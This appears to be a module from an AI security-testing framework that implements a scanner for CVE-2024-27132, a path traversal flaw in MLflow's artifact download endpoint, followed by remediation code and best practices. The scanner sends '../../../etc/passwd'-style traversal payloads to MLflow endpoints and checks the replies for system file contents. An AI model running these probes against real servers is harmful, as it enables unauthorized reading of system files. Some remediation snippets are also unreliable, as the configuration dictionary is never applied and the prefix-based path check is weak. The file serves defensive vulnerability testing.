"""
CVE-2024-27132: MLflow Arbitrary File Read via Artifact Download
Path traversal vulnerability in artifact download endpoint
Maps to OWASP LLM05, CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
"""
import re
import httpx
from app.attacks.base import BaseAttack

class CVEMLflowRead(BaseAttack):
    attack_id = "cve_mlflow_arb_read_2024"
    name = "CVE-2024-27132: MLflow Artifact Download Path Traversal"
    category = "real_world_cves"
    severity = "high"
    description = "Arbitrary file read via path traversal in MLflow artifact download endpoint"
    framework_mapping = {
        "OWASP LLM Top 10": "LLM05",
        "CWE": "CWE-22",
        "CVE": "CVE-2024-27132",
    }

    async def build_payload(self, target_config: dict) -> str:
        """
        Build payload for MLflow artifact path traversal attack.

        Vulnerable endpoints:
        - GET /api/2.0/mlflow/artifacts/get?path=...
        - POST /api/2.0/mlflow/artifacts/download

        Attack vector: Inject "../" sequences in path parameter
        Example: /api/2.0/mlflow/artifacts/get?path=../../../etc/passwd
        """
        return "mlflow_artifact_traversal_test"

    async def evaluate_response(self, response: str, target_config: dict) -> tuple[bool, float]:
        """
        Evaluate MLflow artifact path traversal vulnerability by testing:
        1. MLflow API accessibility
        2. Artifact endpoint path traversal
        3. Ability to read /etc/passwd or system files
        4. Evidence of file content disclosure
        """
        confidence_score = 0.0

        try:
            # Extract endpoint from target config
            endpoint = target_config.get("endpoint_url", "")
            if not endpoint:
                return False, 0.0

            # MLflow typically runs on port 5000
            mlflow_endpoints = [
                endpoint,
                endpoint.replace(":80/", ":5000/"),
                endpoint.replace(":443/", ":5000/"),
                "http://localhost:5000",
            ]

            # Test paths for traversal
            traversal_paths = [
                "../../../etc/passwd",
                "../../etc/passwd",
                "../etc/passwd",
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../etc/hostname",
                "../../../etc/os-release",
            ]

            async with httpx.AsyncClient(timeout=10) as client:
                for mlflow_endpoint in mlflow_endpoints:
                    for traversal_path in traversal_paths:
                        try:
                            # Test /api/2.0/mlflow/artifacts/get endpoint
                            artifact_response = await client.get(
                                f"{mlflow_endpoint}/api/2.0/mlflow/artifacts/get",
                                params={"path": traversal_path},
                                timeout=5
                            )

                            # Check for file content indicators
                            if artifact_response.status_code == 200:
                                if "root:" in artifact_response.text or "bin/bash" in artifact_response.text:
                                    confidence_score += 0.35
                                    break

                            # Test /api/2.0/mlflow/artifacts/download endpoint
                            download_response = await client.get(
                                f"{mlflow_endpoint}/api/2.0/mlflow/artifacts/download",
                                params={"path": traversal_path},
                                timeout=5
                            )

                            if download_response.status_code == 200:
                                if "root:" in download_response.text:
                                    confidence_score += 0.35
                                    break

                        except Exception:
                            pass

                    # Early exit if we found vulnerability
                    if confidence_score >= 0.35:
                        break

            # Test 2: Check for MLflow version or API accessibility
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    for mlflow_endpoint in mlflow_endpoints:
                        try:
                            # Try to access MLflow API health/version endpoint
                            version_response = await client.get(
                                f"{mlflow_endpoint}/health",
                                timeout=5
                            )

                            if version_response.status_code == 200 and "mlflow" in version_response.text.lower():
                                confidence_score += 0.15
                                break

                            # Try alternative endpoints
                            for alt_endpoint in ["/api/2.0/mlflow/runs/get-by-id", "/api/2.0/mlflow/experiments/list"]:
                                alt_response = await client.get(
                                    f"{mlflow_endpoint}{alt_endpoint}",
                                    timeout=5
                                )
                                if alt_response.status_code in [200, 400]:
                                    confidence_score += 0.10
                                    break

                        except Exception:
                            pass

            except Exception:
                pass

            # Analyze response text
            response_lower = response.lower()

            # File content indicators
            system_file_indicators = [
                r'root:.*:0:0:',  # /etc/passwd format
                r'\/bin\/(?:sh|bash|nologin)',
                r'uid=0\(root\)',
                r'\/sbin\/nologin',
            ]

            for indicator in system_file_indicators:
                if re.search(indicator, response):
                    confidence_score += 0.25

            # MLflow-specific indicators
            mlflow_indicators = [
                r'mlflow.*(?:artifact|run|experiment)',
                r'(?:artifact|run).*path',
                r'run_uuid',
                r'experiment_id',
            ]

            for indicator in mlflow_indicators:
                if re.search(indicator, response_lower):
                    confidence_score += 0.08

            # Error messages indicating file system access
            error_indicators = [
                r'file.*(?:not found|not readable)',
                r'permission denied',
                r'no such file',
                r'artifact.*not.*found',
            ]

            for indicator in error_indicators:
                if re.search(indicator, response_lower):
                    confidence_score += 0.10

            # Determine success based on confidence
            if confidence_score >= 0.50:
                return True, min(0.90, confidence_score)
            elif confidence_score >= 0.35:
                return True, confidence_score
            elif confidence_score >= 0.20:
                return True, confidence_score * 0.75

            return False, max(0.0, confidence_score * 0.3)

        except Exception as e:
            return False, 0.0

    def get_remediation(self) -> dict:
        """Return remediation strategies for CVE-2024-27132."""
        return {
            "description": "Patch MLflow artifact download path traversal vulnerability",
            "code_examples": [
                {
                    "language": "bash",
                    "title": "Update MLflow to patched version",
                    "code": """
# CVE-2024-27132 was fixed in MLflow >= 2.10.0
# Update requirements.txt:
# mlflow>=2.10.0

# Upgrade existing installation:
pip install --upgrade mlflow>=2.10.0

# Verify version:
python -c "import mlflow; print(f'MLflow: {mlflow.__version__}')"
"""
                },
                {
                    "language": "python",
                    "title": "Proper artifact path sanitization",
                    "code": """
import os
from pathlib import Path
from typing import Optional

class SecureArtifactStore:
    def __init__(self, artifact_root: str):
        self.artifact_root = Path(artifact_root).resolve()
        self.artifact_root.mkdir(parents=True, exist_ok=True)

    def get_artifact(self, run_id: str, artifact_path: str) -> Optional[bytes]:
        '''Safely retrieve artifact with path validation.'''
        # 1. Validate run_id (alphanumeric only)
        if not run_id.isalnum():
            raise ValueError("Invalid run_id")

        # 2. Sanitize artifact path: remove traversal sequences
        # Remove leading slashes and path traversal attempts
        sanitized_path = artifact_path.lstrip('/')
        if ".." in sanitized_path:
            raise ValueError("Path traversal detected")

        # 3. Construct full path
        run_artifact_dir = (self.artifact_root / run_id).resolve()
        artifact_full_path = (run_artifact_dir / sanitized_path).resolve()

        # 4. Verify path is within artifact directory
        if not str(artifact_full_path).startswith(str(run_artifact_dir)):
            raise ValueError("Artifact path outside allowed directory")

        # 5. Verify file exists and is readable
        if not artifact_full_path.is_file():
            raise FileNotFoundError(f"Artifact not found: {sanitized_path}")

        # 6. Read and return file
        return artifact_full_path.read_bytes()

    def log_artifact(self, run_id: str, local_path: str, artifact_path: str = ""):
        '''Safely log artifact with path validation.'''
        if not run_id.isalnum():
            raise ValueError("Invalid run_id")

        # Sanitize artifact_path
        sanitized_artifact_path = artifact_path.lstrip('/').rstrip('/')
        if ".." in sanitized_artifact_path:
            raise ValueError("Path traversal detected")

        # Ensure target directory is within artifact root
        run_artifact_dir = (self.artifact_root / run_id).resolve()
        run_artifact_dir.mkdir(parents=True, exist_ok=True)

        target_path = run_artifact_dir / sanitized_artifact_path
        target_path = target_path.resolve()

        if not str(target_path).startswith(str(run_artifact_dir)):
            raise ValueError("Target path outside artifact directory")

        # Copy file
        target_path.parent.mkdir(parents=True, exist_ok=True)
        target_path.write_bytes(Path(local_path).read_bytes())
"""
                },
                {
                    "language": "python",
                    "title": "MLflow server secure configuration",
                    "code": """
import mlflow
from mlflow.server import app
from mlflow.entities import Run

# Configure MLflow with security settings
mlflow_config = {
    # 1. Use local artifact store in restricted directory
    'artifact_root': '/var/mlflow/artifacts',

    # 2. Enable authentication
    'auth_enabled': True,

    # 3. Use HTTPS only
    'https_enabled': True,
    'ssl_cert_path': '/path/to/cert.pem',
    'ssl_key_path': '/path/to/key.pem',

    # 4. Restrict backend store
    'backend_store_uri': 'postgresql://user:pass@localhost/mlflow',
}

# Patch artifact download to add path validation
original_download_artifacts = mlflow.tracking.client.MlflowClient.download_artifacts

def safe_download_artifacts(self, run_id: str, path: str = None, dst_path: str = None):
    '''Wrapper with path validation.'''
    # Validate path parameter
    if path:
        if ".." in path or path.startswith('/'):
            raise ValueError("Invalid artifact path")

    # Call original with validated path
    return original_download_artifacts(self, run_id, path, dst_path)

# Apply patch
mlflow.tracking.client.MlflowClient.download_artifacts = safe_download_artifacts
"""
                },
                {
                    "language": "python",
                    "title": "Input validation decorator for MLflow endpoints",
                    "code": """
from functools import wraps
from typing import Callable
import re

def validate_artifact_path(f: Callable) -> Callable:
    '''Decorator to validate artifact paths in MLflow endpoints.'''
    @wraps(f)
    async def wrapper(self, run_id: str, path: str = "", **kwargs):
        # 1. Validate run_id format
        if not re.match(r'^[a-f0-9]{32}$', run_id):
            raise ValueError("Invalid run_id format")

        # 2. Validate artifact path
        if not path:
            path = ""
        else:
            # Remove leading/trailing slashes
            path = path.strip('/')

            # Block path traversal
            if ".." in path or path.startswith('/'):
                raise ValueError("Path traversal not allowed")

            # Block absolute paths
            if re.match(r'^[a-zA-Z]:', path):  # Windows absolute path
                raise ValueError("Absolute paths not allowed")

        return await f(self, run_id, path, **kwargs)

    return wrapper

# Usage
class MLflowSecureAPI:
    @validate_artifact_path
    async def get_artifact(self, run_id: str, path: str):
        '''Get artifact with validated path.'''
        # Implementation
        pass
"""
                }
            ],
            "references": [
                "CVE-2024-27132: MLflow Artifact Download Path Traversal",
                "OWASP LLM Top 10 - LLM05: Supply Chain Vulnerabilities",
                "CWE-22: Improper Limitation of a Pathname to a Restricted Directory",
                "MLflow Security: https://mlflow.org/docs/latest/",
            ],
            "best_practices": [
                "UPDATE IMMEDIATELY: Upgrade MLflow to version 2.10.0 or later",
                "Validate all artifact paths to prevent traversal (../, ..\\)",
                "Use Path.resolve() and verify paths are within artifact root",
                "Implement strict input validation for run_id and artifact_path parameters",
                "Run MLflow server with minimal file system permissions",
                "Store artifacts in dedicated directory with restricted access",
                "Enable MLflow authentication and use strong credentials",
                "Use HTTPS for all MLflow communications",
                "Implement rate limiting on artifact download endpoints",
                "Log all artifact access attempts",
                "Regularly audit artifact store for suspicious access patterns",
                "Use separate storage backend (S3, GCS) instead of local filesystem",
            ],
            "impact": "HIGH: Information disclosure - arbitrary files can be read from server",
            "attack_prerequisites": [
                "MLflow version < 2.10.0",
                "Artifact download endpoint accessible",
                "No path validation implemented",
            ]
        }

    def _describe_finding(self) -> str:
        return "CVE-2024-27132 Path Traversal confirmed: Arbitrary files can be read via path traversal in artifact download endpoint"
